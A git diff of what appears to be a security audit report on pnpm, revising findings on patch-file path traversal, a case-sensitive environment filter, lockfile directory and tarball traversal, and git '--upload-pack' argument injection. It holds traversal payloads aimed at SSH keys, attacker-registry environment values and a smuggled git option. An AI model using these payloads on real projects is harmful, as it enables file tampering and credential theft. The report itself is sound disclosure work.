-The exploit publishes a trivial package, runs an initial `pnpm install` to generate a lockfile, then adds a malicious `.patch` file and `pnpm-workspace.yaml` with `patchedDependencies`. After clearing the store and re-running install, `/tmp/vuln6_pwned` is created with attacker-controlled content, demonstrating arbitrary file write outside the package sandbox.
-
-### Impact
-
-Arbitrary file write as the user running `pnpm install`. An attacker can overwrite SSH keys, shell configuration files, CI/CD credentials, system binaries (if running as root), or any other file the process has write access to. Combined with the ability to create directories (`fs.ensureDirSync`), this can establish persistence on developer machines and CI systems. The `--frozen-lockfile` flag provides no protection since the patch file path and `pnpm-workspace.yaml` are separate from the lockfile.
-
-### Remediation
-
-1. **Validate paths after `dirname` resolution:** After parsing patch file paths, resolve them against the package root and reject any path that escapes with `path.resolve` + prefix check: if `!resolvedPath.startsWith(packageRoot)`, throw an error.
-2. **Sanitize at parse time:** In `parse.js`, reject any parsed path that contains `..` components before returning the parsed patch object.
-3. **Sandbox the CWD:** Rather than using `process.chdir`, resolve all effect paths against the package directory before executing effects, keeping the process CWD stable and making traversal attempts explicit.
-4. **Apply a blocklist** to the `patchedDependencies` patch file paths in `pnpm-workspace.yaml` so paths outside the workspace are rejected at config load time.
-
----
-
-## VULN-7: Arbitrary File Deletion via Malicious Patch File (Path Traversal)
-
-**Severity:** High
-**CVSS v3.1 Score:** 7.3 (AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:H)
-**Proof of Concept:** `exploits/vuln7_patch_traversal_delete/exploit.sh`
-
-### Affected Code
-
-| File | Lines | Role |
-|------|-------|------|
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 88 | `diff --git a/(.*?) b/(.*?)` regex extracts paths with no sanitization |
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 126 | `--- a/` path sliced from line with no sanitization |
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 223-235 | `interpretParsedPatchFile`: file deletion uses `diffLineFromPath \|\| fromPath` as `eff.path` |
-| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/apply.js` | 13-22 | `executeEffects`: `fs.unlinkSync(eff.path)` with no path validation; `// TODO: integrity checks` comment confirms authors knew validation was absent |
-| `patching/apply-patch/src/index.ts` | 12-13 | `process.chdir(opts.patchedDir)` sets CWD to installed package dir before effects execute |
-| `building/during-install/src/index.ts` | 185 | `applyPatchToDir({ patchedDir: depNode.dir, patchFilePath: ... })` triggered during `pnpm install` |
-
-### Description
-
-The same path traversal root cause as VULN-6 applies to file deletion effects. A patch with `deleted file mode 100644` triggers the "file deletion" effect type in `interpretParsedPatchFile`. The `executeEffects` function for a deletion effect calls `fs.unlinkSync(eff.path)` with the unsanitized path from the `diff --git a/PATH` header. The `// TODO: integrity checks` comment at `apply.js:20` confirms the authors were aware that validation was missing.
+**File delete variant:** The same root cause applies to file deletion effects. A patch with `deleted file mode 100644` triggers the "file deletion" effect type. The `executeEffects` function calls `fs.unlinkSync(eff.path)` with the unsanitized path. The `// TODO: integrity checks` comment at `apply.js:20` confirms the authors were aware that validation was missing.
 
 ```javascript
 // apply.js:13-22 (vulnerable -- file deletion effect)
@@ -502,203 +397,98 @@ case 'file deletion': {
 }
 ```
 
-The `diff --git` header `a/../../../../../../../../../../tmp/vuln7_target b/../../../../../../../../../../tmp/vuln7_target` with `deleted file mode 100644` triggers the file deletion effect. The `interpretParsedPatchFile` function at `parse.js:224` uses `diffLineFromPath` (from the `diff --git a/` path) as `eff.path`, resolving to `/tmp/vuln7_target` when the process CWD is inside the virtual store.
+Both variants share the same root cause: the `interpretParsedPatchFile` function at `parse.js:223-249` uses `diffLineFromPath` (from the `diff --git a/` path) for deletion and `diffLineToPath` (from the `diff --git b/` path) for creation as `eff.path`, with no containment check.
 
 ### Attack Scenario
 
-1. Attacker gains the ability to contribute a `.patch` file to a project (pull request, compromised contributor, or compromised CI).
-2. Attacker crafts a patch file with a deletion header whose path traverses out of the package directory: `diff --git a/../../../../../../../../../../home/user/.ssh/authorized_keys b/../../../../../../../../../../home/user/.ssh/authorized_keys` with `deleted file mode 100644`.
-3. Victim runs `pnpm install`.
-4. pnpm applies the malicious patch and `fs.unlinkSync` deletes the target file, removing SSH keys, credentials, or any other critical file the process has access to.
+1. Attacker gains the ability to contribute a `.patch` file to a project (pull request, compromised contributor, compromised CI that writes `pnpm-workspace.yaml`).
+2. Attacker crafts a patch file with `diff --git` headers whose paths traverse out of the package directory (e.g., targeting `~/.ssh/authorized_keys`).
+3. A `new file mode 100644` block writes attacker-controlled content to the target path. A `deleted file mode 100644` block deletes the target file. Both can be combined in a single patch.
+4. The `patchedDependencies` entry is committed alongside the patch file.
+5. Victim developer or CI pipeline runs `pnpm install`.
+6. pnpm applies the malicious patch: `fs.writeFileSync` writes and/or `fs.unlinkSync` deletes files at the traversed paths.
 
 ### Proof of Concept
 
+**Write variant:**
+```bash
+# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
+bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
+# Expected: PASS -- /tmp/vuln6_pwned created with content PWNED_BY_MALICIOUS_PATCH
+```
+
+The exploit publishes a trivial package, runs an initial `pnpm install` to generate a lockfile, then adds a malicious `.patch` file and `pnpm-workspace.yaml` with `patchedDependencies`. After clearing the store and re-running install, `/tmp/vuln6_pwned` is created with attacker-controlled content.
+
+**Delete variant:**
 ```bash
 # Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
 bash autofyn_audit/exploits/vuln7_patch_traversal_delete/exploit.sh
 # Expected: PASS -- /tmp/vuln7_target deleted by malicious patch
 ```
 
-The exploit publishes a trivial package, runs an initial `pnpm install`, then adds a malicious `.patch` file with a deletion effect and `pnpm-workspace.yaml` with `patchedDependencies`. Before the second install, the target file `/tmp/vuln7_target` is created. After the install, the file is absent, demonstrating arbitrary file deletion outside the package sandbox.
+The exploit publishes a trivial package, runs an initial `pnpm install`, then adds a malicious `.patch` file with a deletion effect. Before the second install, the target file `/tmp/vuln7_target` is created. After install, the file is absent.
 
 ### Impact
 
-Arbitrary file deletion as the user running `pnpm install`. An attacker can delete SSH keys, CI/CD credential files, lock files, database files, or any other file the process has access to. This can cause denial of service (deleting critical system or application files), disrupt CI/CD pipelines, or be chained with other attacks (delete a credential file, then write a replacement via VULN-6). No content verification is performed before deletion — the `// TODO: integrity checks` comment in the source confirms this was a known omission.
+Arbitrary file write and delete as the user running `pnpm install`. An attacker can overwrite SSH keys, shell configuration files, CI/CD credentials, or any other file the process has write access to. The `--frozen-lockfile` flag provides no protection since the patch file path and `pnpm-workspace.yaml` are separate from the lockfile.
+
+### Caveats
+
+- **Requires repository commit access.** The attacker must be able to commit both a `.patch` file and a `pnpm-workspace.yaml` modification to the project. An attacker with this level of access can often cause equivalent damage through other means -- for example, committing a malicious postinstall script directly. The path traversal is an incremental defense-in-depth gap rather than a unique attack vector.
+- **Patch files are human-readable.** A careful code reviewer examining the `.patch` file would see the `../` sequences in the diff headers. However, patch files are not commonly subject to detailed security review.
+- **npm and yarn do not have a built-in patch mechanism.** The `patch-package` npm module (the upstream of pnpm's vendored fork) has the same vulnerability. This is shared with the `patch-package` ecosystem rather than unique to pnpm.
 
 ### Remediation
 
-Same root cause as VULN-6; the same fixes apply:
-
-1. **Validate paths at effect execution time:** Resolve `eff.path` against the package root and reject any path that escapes with a `path.resolve` + prefix check before calling `fs.unlinkSync`.
-2. **Sanitize at parse time:** Reject any parsed path containing `..` components in `parse.js`.
-3. **Sandbox the CWD:** Resolve all effect paths against the package directory before executing, rather than relying on `process.chdir`.
+1. **Validate paths after resolution:** After parsing patch file paths, resolve them against the package root and reject any path that escapes with `path.resolve` + prefix check: if `!resolvedPath.startsWith(packageRoot)`, throw an error.
+2. **Sanitize at parse time:** In `parse.js`, reject any parsed path that contains `..` components before returning the parsed patch object.
+3. **Sandbox the CWD:** Rather than using `process.chdir`, resolve all effect paths against the package directory before executing effects, keeping the process CWD stable and making traversal attempts explicit.
 4. **Implement the TODO:** The `// TODO: integrity checks` comment at `apply.js:20` should be resolved: verify the file to be deleted matches the expected content from the patch hunk before deleting it, and verify the path is within bounds.
 
 ---
 
-## VULN-8: Lifecycle Script Env Sanitization Bypass via Case-Sensitive Filter
+## VULN-6: Lockfile Resolution Path Traversal (Directory and Tarball Fetchers)
 
-**Severity:** Medium
-**CVSS v3.1 Score:** 5.3 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N)
-**Proof of Concept:** `exploits/vuln8_env_config_bypass/exploit.sh`
-
-### Affected Code
-
-| File | Lines | Role |
-|------|-------|------|
-| `exec/lifecycle/node_modules/@pnpm/npm-lifecycle/index.js` | 358-362 | `makeEnv()` filters env with `/^npm_/` (case-sensitive), leaving uppercase vars unfiltered |
-
-### Description
-
-The `makeEnv()` function in the vendored `@pnpm/npm-lifecycle` package constructs the environment passed to lifecycle scripts during `pnpm install`. It iterates `process.env` and copies vars that do NOT match `/^npm_/` into the new env object:
-
-```javascript
-// exec/lifecycle/node_modules/@pnpm/npm-lifecycle/index.js:358-362
-for (const i in process.env) {
-  if (!i.match(/^npm_/) && (!i.match(/^PATH$/i) || i === PATH)) {
-    env[i] = process.env[i]
-  }
-}
-```
-
-The regex `/^npm_/` is case-sensitive. It correctly blocks `npm_config_registry`, `npm_package_name`, and similar lowercase vars — but it does not block `NPM_CONFIG_REGISTRY`, `NPM_CONFIG_CACHE`, or any other uppercase variant.
-
-npm's `@npmcli/config` reads environment variables case-insensitively using `/^npm_config_/i`. Inside a lifecycle script, any npm invocation (including the one that spawned the script itself via npm hooks) will read `NPM_CONFIG_REGISTRY` and treat it as a config override, redirecting registry operations to whatever value it holds. This means an attacker who can inject `NPM_CONFIG_REGISTRY` into the process environment (e.g., via a CI/CD pipeline variable, a compromised tool in the build chain, or a social-engineering PR that sets an env var) can redirect all npm activity inside lifecycle scripts to a malicious registry — even though pnpm's sanitization was supposed to prevent exactly this.
-
-### Attack Scenario
-
-1. A CI/CD pipeline has `NPM_CONFIG_REGISTRY=https://attacker.example.com/` set as an environment variable (injected via a PR, a compromised build step, or a misconfigured CI template).
-2. The project runs `pnpm install`, which invokes lifecycle scripts (postinstall hooks) for installed packages.
-3. pnpm's `makeEnv()` filters lowercase `npm_config_registry` but passes `NPM_CONFIG_REGISTRY` through unmodified.
-4. Inside a lifecycle script that calls `npm install`, `npm exec`, or any npm operation, npm reads `NPM_CONFIG_REGISTRY` (case-insensitive match) and uses the attacker's registry URL.
-5. The lifecycle script fetches packages from the attacker's registry, which can serve malicious content, log all requests (package enumeration), or capture authentication tokens from subsequent npm operations.
-
-### Proof of Concept
-
-```bash
-# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
-bash autofyn_audit/exploits/vuln8_env_config_bypass/exploit.sh
-# Expected: PASS -- uppercase NPM_CONFIG_REGISTRY bypassed env sanitization filter
-```
-
-The exploit publishes `env-checker@1.0.0` with a postinstall script that reads `process.env.NPM_CONFIG_REGISTRY` (uppercase) and `process.env.npm_config_registry` (lowercase) and writes each to a marker file if set. The test project runs `pnpm install` with both env vars set to `http://evil-registry.example.com/` and `--registry http://localhost:4873` as a CLI flag (so pnpm's own resolution uses verdaccio). After install, the uppercase marker exists with the evil registry URL (bypassed), while the lowercase marker is absent or contains pnpm's own computed value (filtered correctly).
-
-### Impact
-
-npm config injection in lifecycle scripts. An attacker with control over even one environment variable can redirect all npm operations performed by lifecycle scripts to a malicious registry. Common npm config targets beyond registry include `NPM_CONFIG_CACHE` (redirect cache to an attacker-controlled path), `NPM_CONFIG_GLOBALCONFIG` (load a malicious global config), and `NPM_CONFIG_USERCONFIG` (load a malicious user config). This bypass is invisible to pnpm users who rely on env sanitization to protect their builds.
-
-### Remediation
-
-Change the case-sensitive regex `/^npm_/` to a case-insensitive regex `/^npm_/i` at line 359 of `exec/lifecycle/node_modules/@pnpm/npm-lifecycle/index.js`:
-
-```javascript
-// Before (vulnerable)
-if (!i.match(/^npm_/) && (!i.match(/^PATH$/i) || i === PATH)) {
-
-// After (fixed)
-if (!i.match(/^npm_/i) && (!i.match(/^PATH$/i) || i === PATH)) {
-```
-
-This ensures that `NPM_CONFIG_REGISTRY`, `NPM_PACKAGE_NAME`, and all other uppercase `npm_*` variants are filtered out of the lifecycle environment, consistent with the intended sanitization behavior.
-
----
-
-## VULN-9: Lockfile `resolution.directory` Path Traversal (Arbitrary Directory Read)
-
-**Severity:** High
-**CVSS v3.1 Score:** 7.1 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N)
-**Proof of Concept:** `exploits/vuln9_directory_traversal/exploit.sh`
+**Severity:** Medium  
+**CVSS v3.1 Score:** 4.5 (AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N)  
+**Proof of Concept (directory):** `exploits/vuln9_directory_traversal/exploit.sh`  
+**Proof of Concept (tarball):** `exploits/vuln10_tarball_path_traversal/exploit.sh`
 
 ### Affected Code
 
+**Directory fetcher path:**
+
 | File | Lines | Role |
 |------|-------|------|
-| `fetching/directory-fetcher/src/index.ts` | 30 | `path.resolve(opts.lockfileDir, resolution.directory)` — no bounds check |
+| `fetching/directory-fetcher/src/index.ts` | 30 | `path.resolve(opts.lockfileDir, resolution.directory)` -- no bounds check |
 | `lockfile/utils/src/pkgSnapshotToResolution.ts` | 16-21 | Returns `pkgSnapshot.resolution` as-is when `type` field is truthy |
 | `fetching/pick-fetcher/src/index.ts` | 54 | Routes `resolution.type === 'directory'` to `directoryFetcher` |
 | `deps/graph-builder/src/lockfileToDepGraph.ts` | 217, 282-294 | Builds dep graph from lockfile, calls `storeController.fetchPackage` with unsanitized resolution |
 
+**Local tarball fetcher path:**
+
+| File | Lines | Role |
+|------|-------|------|
+| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 19 | `resolvePath(opts.lockfileDir, resolution.tarball.slice(5))` -- no bounds check |
+| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 20 | `gfs.readFileSync(tarball)` -- reads arbitrary resolved path |
+| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 38-41 | `resolvePath` accepts absolute or relative paths with no containment check |
+| `fetching/pick-fetcher/src/index.ts` | 41 | `resolution.tarball.startsWith('file:')` routes to `localTarball` fetcher |
+
 ### Description
 
-The directory fetcher at `fetching/directory-fetcher/src/index.ts:30` resolves `resolution.directory` from lockfile entries using `path.resolve(opts.lockfileDir, resolution.directory)` with no validation that the resolved path is within the project or workspace boundary.
+Two fetcher code paths trust lockfile-provided resolution fields without path containment checks, enabling an attacker who can modify the lockfile to read arbitrary directories or files from the build machine.
+
+**Directory fetcher:** The directory fetcher at `fetching/directory-fetcher/src/index.ts:30` resolves `resolution.directory` from lockfile entries using `path.resolve(opts.lockfileDir, resolution.directory)` with no validation that the resolved path is within the project or workspace boundary. When a lockfile entry's resolution is changed from a tarball type to a directory type (`{type: directory, directory: '../../../../../../sensitive_dir'}`), `pkgSnapshotToResolution` sees the truthy `type` field and returns the resolution verbatim. The directory fetcher reads all files from the target directory into the content-addressable store and hardlinks them into `node_modules/<package>/`.
 
 ```typescript
 // fetching/directory-fetcher/src/index.ts:26-31 (vulnerable)
 const directoryFetcher: DirectoryFetcher = (cafs, resolution, opts) => {
-  // Use path.resolve so absolute directories (e.g. cross-drive Windows paths
-  // stored by `file:` deps) are respected instead of being concatenated
-  // onto lockfileDir.
   const dir = path.resolve(opts.lockfileDir, resolution.directory)  // no bounds check
   return fetchFromDir(dir)
 }
 ```
 
-When a lockfile entry's resolution is changed from a tarball type (`{integrity: ..., tarball: ...}`) to a directory type (`{type: directory, directory: '../../../../../../sensitive_dir'}`), `pkgSnapshotToResolution` at lines 16-21 sees the truthy `type` field and returns the resolution verbatim:
-
-```typescript
-// lockfile/utils/src/pkgSnapshotToResolution.ts:16-21 (routes to directory fetcher)
-if (
-  Boolean((pkgSnapshot.resolution as TarballResolution).type) ||
-  (pkgSnapshot.resolution as TarballResolution).tarball?.startsWith('file:') ||
-  (pkgSnapshot.resolution as TarballResolution).gitHosted === true
-) {
-  return pkgSnapshot.resolution as Resolution  // returned as-is — no path validation
-}
-```
-
-The `pickFetcher` at line 54 routes it to the directory fetcher, which resolves the traversal path to an absolute location and reads all files from that directory into the content-addressable store. Those files are then hardlinked into `node_modules/<package>/`, making sensitive data accessible to any code in the project.
-
-### Attack Scenario
-
-1. Attacker gains write access to `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine).
-2. Attacker modifies a single package's `resolution` in the lockfile from tarball to directory type with a path traversal: `{directory: ../../../../../../home/user/.ssh, type: directory}`.
-3. The lockfile's `packages:` entry key is changed from `pkg@1.0.0` to `pkg@file:../../../../../../home/user/.ssh`, and the `importers` version reference is updated to match.
-4. The `package.json` is changed from `"pkg": "1.0.0"` to `"pkg": "file:../../../../../../home/user/.ssh"` to match (making the change look like a local dependency reference).
-5. Victim runs `pnpm install`.
-6. The directory fetcher reads ALL files from the target directory (SSH keys, credentials, configs) into the CAFS store and hardlinks them into `node_modules/<package>/`.
-7. A postinstall script from any other package — or any project script — can read and exfiltrate the stolen files from `node_modules/`.
-
-### Proof of Concept
-
-```bash
-# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
-bash autofyn_audit/exploits/vuln9_directory_traversal/exploit.sh
-# Expected: PASS -- secret_key.pem and credentials.json found in node_modules/dir-traversal-target/
-```
-
-The exploit creates a sensitive target directory at `/tmp/vuln9_secrets/` containing a fake PEM private key (`secret_key.pem`), fake AWS credentials (`credentials.json`), and a fake DB password (`internal_config.env`). It publishes a legitimate `dir-traversal-target@1.0.0` package to verdaccio, runs an initial install to generate a valid lockfile, then uses python3 to tamper the lockfile — changing the resolution from tarball type to directory type with a path traversal pointing at `/tmp/vuln9_secrets`. After clearing the store and re-running install, the sensitive files appear in `node_modules/dir-traversal-target/`, confirming arbitrary directory content theft.
-
-### Impact
-
-Arbitrary directory content theft. An attacker who can modify the lockfile can silently redirect a dependency resolution to read sensitive directories on the build machine. SSH keys, cloud credentials, database configs, and proprietary source code are all accessible. The attack is particularly dangerous in CI/CD environments where `pnpm install --frozen-lockfile` is used and the lockfile is trusted. Unlike VULN-6/7 (patch path traversal which writes/deletes files), this vulnerability READS files — it is a data exfiltration vector.
-
-### Remediation
-
-1. **Validate resolved directory path:** After resolving `resolution.directory`, check that the result is within the project or workspace root. Reject paths that escape via `!resolvedPath.startsWith(workspaceRoot)`.
-2. **Validate resolution type consistency:** When reading lockfile entries, verify that the resolution type is consistent with the dependency specifier (e.g., a semver specifier should not resolve to a directory type).
-3. **Warn on resolution type changes:** Emit a warning when a lockfile entry's resolution type differs from what the resolver would produce for the given specifier.
-
----
-
-## VULN-10: Lockfile `resolution.tarball` Local File Path Traversal (Arbitrary File Read)
-
-**Severity:** High
-**CVSS v3.1 Score:** 7.1 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N)
-**Proof of Concept:** `exploits/vuln10_tarball_path_traversal/exploit.sh`
-
-### Affected Code
-
-| File | Lines | Role |
-|------|-------|------|
-| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 19 | `resolvePath(opts.lockfileDir, resolution.tarball.slice(5))` — no bounds check |
-| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 20 | `gfs.readFileSync(tarball)` — reads arbitrary resolved path |
-| `fetching/tarball-fetcher/src/localTarballFetcher.ts` | 38-41 | `resolvePath` accepts absolute or relative paths with no containment check |
-| `lockfile/utils/src/pkgSnapshotToResolution.ts` | 18 | `tarball?.startsWith('file:')` returns resolution as-is |
-| `fetching/pick-fetcher/src/index.ts` | 41 | `resolution.tarball.startsWith('file:')` routes to `localTarball` fetcher |
-
-### Description
-
-The local tarball fetcher at `fetching/tarball-fetcher/src/localTarballFetcher.ts:19` resolves the tarball path by stripping the `file:` prefix from `resolution.tarball` via `.slice(5)` and passing the result to `resolvePath(opts.lockfileDir, ...)`. The `resolvePath` helper at lines 38-41 simply calls `path.resolve(where, spec)` with no validation that the result stays within the project or workspace boundary. The resolved path is then passed directly to `gfs.readFileSync(tarball)` at line 20, reading the file from disk. The resulting buffer is imported into the content-addressable store and hardlinked into `node_modules/`, making the contents of the arbitrary file accessible to all project code.
+**Local tarball fetcher:** The local tarball fetcher at `fetching/tarball-fetcher/src/localTarballFetcher.ts:19` resolves the tarball path by stripping the `file:` prefix from `resolution.tarball` via `.slice(5)` and passing the result to `resolvePath(opts.lockfileDir, ...)`. The `resolvePath` helper simply calls `path.resolve(where, spec)` with no containment check. The resolved path is passed directly to `gfs.readFileSync(tarball)`, reading the file from disk and importing it into `node_modules/`.
 
 ```typescript
 // fetching/tarball-fetcher/src/localTarballFetcher.ts:17-20 (vulnerable)
@@ -707,68 +497,77 @@ const fetch = (cafs: Cafs, resolution: Resolution, opts: FetchOptions) => {
   const buffer = gfs.readFileSync(tarball)  // reads arbitrary path
   return addFilesFromTarball({ ..., buffer, ... })
 }
-
-// localTarballFetcher.ts:38-41 (resolvePath -- no containment check)
-function resolvePath (where: string, spec: string): string {
-  if (isAbsolutePath.test(spec)) return spec
-  return path.resolve(where, spec)  // relative paths can traverse arbitrarily
-}
 ```
-
-The routing to this fetcher is determined by `pkgSnapshotToResolution` at line 18, which returns any resolution whose `tarball` field starts with `file:` verbatim, and by `pickFetcher` at line 41, which routes those resolutions to the `localTarball` fetcher. Neither performs any path validation. The `integrity` field is optional on local tarballs, so removing it from the lockfile does not cause a verification failure — the fetcher reads and installs whatever file is at the resolved path unconditionally.
 
 ### Attack Scenario
 
-1. Attacker gains write access to the project's `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine, or direct repo access).
-2. Attacker changes a package's `resolution` from the registry tarball (`{integrity: sha512-..., tarball: http://registry/...}`) to a local file traversal (`{tarball: 'file:../../../../../../../tmp/victim_secrets/sensitive.tgz'}`), removing the `integrity` field.
-3. The `packages:` entry key, `snapshots:` entry key, and `importers:` version reference are updated to match the new specifier.
-4. The `package.json` dependency specifier is updated to `file:../../../../../../../tmp/victim_secrets/sensitive.tgz`.
-5. Victim runs `pnpm install`. The local tarball fetcher reads the attacker-chosen `.tgz` file, extracts its contents into the store, and hardlinks them into `node_modules/<package>/`.
-6. Any code in the project — including postinstall scripts from other packages — can read and exfiltrate the stolen files from `node_modules/`.
+1. Attacker gains write access to the project's `pnpm-lock.yaml` AND `package.json` (pull request, compromised CI, compromised developer machine, or direct repo access).
+2. For the directory variant: attacker modifies a package's `resolution` in the lockfile from tarball to directory type with a path traversal (`{directory: ../../../../../../home/user/.ssh, type: directory}`), updates the `packages:` entry key to `pkg@file:../../../../../../home/user/.ssh`, and changes `package.json` to `"pkg": "file:../../../../../../home/user/.ssh"`.
+3. For the tarball variant: attacker changes the `resolution` to `{tarball: 'file:../../../../../../../tmp/secrets/sensitive.tgz'}`, removes the `integrity` field, and updates `package.json` to match.
+4. Victim runs `pnpm install`.
+5. The fetcher reads the target directory contents or tarball file from disk and hardlinks them into `node_modules/<package>/`.
+6. A postinstall script from any other package -- or any project script -- can read and exfiltrate the stolen files.
 
 ### Proof of Concept
 
+**Directory variant:**
+```bash
+# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
+bash autofyn_audit/exploits/vuln9_directory_traversal/exploit.sh
+# Expected: PASS -- secret_key.pem and credentials.json found in node_modules/dir-traversal-target/
+```
+
+The exploit creates a sensitive target directory at `/tmp/vuln9_secrets/` containing fake credentials, publishes a legitimate package to verdaccio, generates a lockfile, then tampers the lockfile to redirect the resolution to the secrets directory. After re-running install, the sensitive files appear in `node_modules/dir-traversal-target/`.
+
+**Tarball variant:**
 ```bash
 # Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
 bash autofyn_audit/exploits/vuln10_tarball_path_traversal/exploit.sh
 # Expected: PASS -- secret_ssh_key.pem and api_credentials.json found in node_modules/tarball-read-target/
 ```
 
-The exploit creates a sensitive tarball at `/tmp/vuln10_secrets/stolen_data.tgz` containing a fake SSH private key (`secret_ssh_key.pem`) and fake AWS credentials (`api_credentials.json`) inside the npm `package/` prefix convention. It publishes a legitimate `tarball-read-target@1.0.0` to verdaccio, runs an initial install to generate a valid lockfile, then uses python3 to tamper the lockfile — changing the resolution from the registry tarball to `file:../../../../../../tmp/vuln10_secrets/stolen_data.tgz` and removing the `integrity` field. After clearing the store and re-running install, the sensitive files appear in `node_modules/tarball-read-target/`, confirming arbitrary tarball read.
+The exploit creates a sensitive tarball at `/tmp/vuln10_secrets/stolen_data.tgz`, publishes a legitimate package, generates a lockfile, then tampers the lockfile to redirect to the local tarball. After re-running install, the sensitive files appear in `node_modules/tarball-read-target/`.
 
 ### Impact
 
-Arbitrary file read disguised as a package installation. Any `.tgz` file accessible on disk that follows npm's `package/` prefix convention — or any attacker-controlled tarball placed anywhere on the filesystem — can be imported as a dependency. The attack is particularly dangerous in CI/CD environments where build workers share a filesystem: secrets stored outside the project directory (SSH keys, cloud credentials, other projects' tarballs) are silently imported into `node_modules/`. Unlike VULN-9 (directory traversal), this attack reads a single tarball and unpacks it, giving the attacker control over exactly which files appear in `node_modules/` and with what content.
+Data exfiltration from the build machine. An attacker who can modify the lockfile and `package.json` can silently redirect a dependency resolution to read sensitive directories or files on disk. SSH keys, cloud credentials, database configs, and proprietary source code are potential targets. The attack is relevant in CI/CD environments where `pnpm install --frozen-lockfile` is used and the lockfile is trusted.
+
+### Caveats
+
+- **Requires modifying BOTH lockfile AND package.json.** This is a significant precondition. The attacker must change the dependency specifier in `package.json` to a `file:` reference that matches the lockfile entry. A PR that changes both `package.json` and the lockfile simultaneously is more likely to attract review attention than a lockfile-only change.
+- **Circular threat model.** An attacker with the ability to modify `package.json` can add a direct `file:` dependency pointing anywhere on disk without needing to tamper the lockfile. The lockfile path traversal provides no additional capability beyond what the `package.json` change already enables. The finding is a defense-in-depth gap: pnpm should validate resolution paths regardless, but the incremental attack surface is limited.
+- **npm and yarn handle `file:` dependencies similarly.** The `file:` protocol is designed to reference local packages, and other package managers also resolve these paths without strict containment. The concern is shared across the ecosystem.
 
 ### Remediation
 
-1. **Validate resolved tarball path:** After calling `resolvePath`, check that the resolved path is within the project or workspace root. Reject paths where `!resolvedPath.startsWith(workspaceRoot)`.
-2. **Reject `..` components:** In `resolvePath` or before calling it, reject any `spec` that contains `..` path components.
-3. **Require integrity for local tarballs:** When installing from a `file:` tarball, require an `integrity` field and verify the hash before importing. This prevents substitution of an arbitrary tarball even if the path passes containment checks.
+1. **Validate resolved paths:** After resolving `resolution.directory` or `resolution.tarball`, check that the result is within the project or workspace root. Reject paths that escape via `!resolvedPath.startsWith(workspaceRoot)`.
+2. **Validate resolution type consistency:** When reading lockfile entries, verify that the resolution type is consistent with the dependency specifier (e.g., a semver specifier should not resolve to a directory type).
+3. **Reject `..` components:** In `resolvePath` or before calling it, reject any spec that contains `..` path components.
+4. **Require integrity for local tarballs:** When installing from a `file:` tarball, require an `integrity` field and verify the hash before importing.
 
 ---
 
-## VULN-11: Git Fetch `--upload-pack` Argument Injection via `resolution.commit` (RCE)
+## VULN-7: Git Fetch `--upload-pack` Argument Injection via `resolution.commit`
 
-**Severity:** High
-**CVSS v3.1 Score:** 7.5 (AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N)
+**Severity:** Medium  
+**CVSS v3.1 Score:** 5.5 (AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N)  
 **Proof of Concept:** `exploits/vuln11_git_upload_pack_rce/exploit.sh`
 
 ### Affected Code
 
 | File | Lines | Role |
 |------|-------|------|
-| `fetching/git-fetcher/src/index.ts` | 33 | `execGit(['fetch', '--depth', '1', 'origin', resolution.commit])` — no `--` separator |
-| `fetching/git-fetcher/src/index.ts` | 37 | `execGit(['checkout', resolution.commit])` — no `--` separator |
+| `fetching/git-fetcher/src/index.ts` | 33 | `execGit(['fetch', '--depth', '1', 'origin', resolution.commit])` -- no `--` separator |
+| `fetching/git-fetcher/src/index.ts` | 37 | `execGit(['checkout', resolution.commit])` -- no `--` separator |
 | `fetching/git-fetcher/src/index.ts` | 30 | Shallow condition: `allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)` |
-| `fetching/git-fetcher/src/index.ts` | 81-91 | `shouldUseShallow` — parses URL host, checks against `allowedHosts` set |
-| `fetching/git-fetcher/src/index.ts` | 97-101 | `execGit` — passes args directly to `execa('git', fullArgs, opts)`, no sanitization |
+| `fetching/git-fetcher/src/index.ts` | 81-91 | `shouldUseShallow` -- parses URL host, checks against `allowedHosts` set |
+| `fetching/git-fetcher/src/index.ts` | 97-101 | `execGit` -- passes args directly to `execa('git', fullArgs, opts)`, no sanitization |
 | `lockfile/utils/src/pkgSnapshotToResolution.ts` | 16-21 | Returns resolution verbatim when `type` field is truthy |
 | `lockfile/types/src/index.ts` | 120-125 | `GitRepositoryResolution` has `commit: string` with no format constraint |
 
 ### Description
 
-The git fetcher at `fetching/git-fetcher/src/index.ts:33` passes `resolution.commit` from the lockfile directly to `git fetch` as a positional argument without a `--` separator. Git parses all arguments before `--` as options. If `resolution.commit` is `--upload-pack=<command>`, git treats it as the `--upload-pack` option, which specifies the program to invoke as the upload-pack binary on the remote side. For `file://` and SSH transports, git shells out the specified command. The command executes before git determines that the specified program is not a valid upload-pack binary, causing the fetch to fail — but the injected command has already run.
